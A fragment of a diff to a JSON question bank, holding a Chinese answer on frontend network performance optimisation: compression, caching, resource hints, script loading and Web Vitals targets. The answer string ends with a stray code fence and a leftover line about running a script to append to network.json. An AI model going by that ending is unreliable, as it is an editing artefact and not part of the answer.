     "answer": "## 前端网络性能综合优化\n\n### 1. 减少请求数量\n```\n- 代码分割（Code Splitting）：按路由懒加载\n- 雪碧图（Sprite）→ 已被 SVG Icon / 字体图标替代\n- 内联关键资源（Critical CSS 内联）\n- 合并小文件（HTTP/1.1 下），HTTP/2 后反而要拆分\n```\n\n### 2. 减少传输体积\n```\n- JS/CSS/HTML 压缩（Minify）\n- Gzip 压缩（70% 体积减少）\n- Brotli 压缩（比 Gzip 再减 15-20%）\n- Tree Shaking 删除未用代码\n- 图片优化：WebP/AVIF 格式，响应式图片\n- 视频使用流式传输\n```\n\n### 3. 利用缓存\n```\n- 强缓存：带 hash 的静态资源（max-age=31536000, immutable）\n- 协商缓存：HTML 文件（no-cache）\n- Service Worker 离线缓存\n- CDN 边缘缓存\n```\n\n### 4. 加快资源发现\n```html\n<link rel=\"preload\" href=\"/critical.js\" as=\"script\">\n<link rel=\"preload\" href=\"/font.woff2\" as=\"font\" crossorigin>\n<link rel=\"prefetch\" href=\"/next-page.js\">\n<link rel=\"preconnect\" href=\"https://cdn.example.com\">\n<link rel=\"dns-prefetch\" href=\"//analytics.com\">\n```\n\n### 5. 渲染优化\n```html\n<!-- JS 不阻塞 HTML 解析 -->\n<script src=\"app.js\" defer></script>\n<script src=\"analytics.js\" async></script>\n\n<!-- 图片懒加载 -->\n<img src=\"image.jpg\" loading=\"lazy\" decoding=\"async\">\n\n<!-- 关键 CSS 内联，非关键异步 -->\n<style>/* 首屏关键样式 */</style>\n<link rel=\"preload\" href=\"app.css\" as=\"style\" onload=\"this.rel='stylesheet'\">\n```\n\n### 6. 使用现代协议\n```\nHTTP/2：多路复用、头部压缩、Server Push\nHTTP/3：QUIC、0-RTT、连接迁移\nTLS 1.3：更快握手\n```\n\n### 7. 度量指标\n```\nLCP（最大内容绘制）< 2.5s\nFID/INP（交互延迟）< 100ms / 200ms\nCLS（累积布局偏移）< 0.1\nTTFB（首字节时间）< 800ms\nFCP（首次内容绘制）< 1.8s\n\n工具：Lighthouse、WebPageTest、Chrome DevTools Network\n```\n```\n\n现在运行脚本转换并追加到 network.json：",
-    "tags": [
-      "网络优化",
-      "性能",
-      "前端工程"
-    ],
+    "tags": ["网络优化", "性能", "前端工程"],
     "source": "高频"
   }
 ]
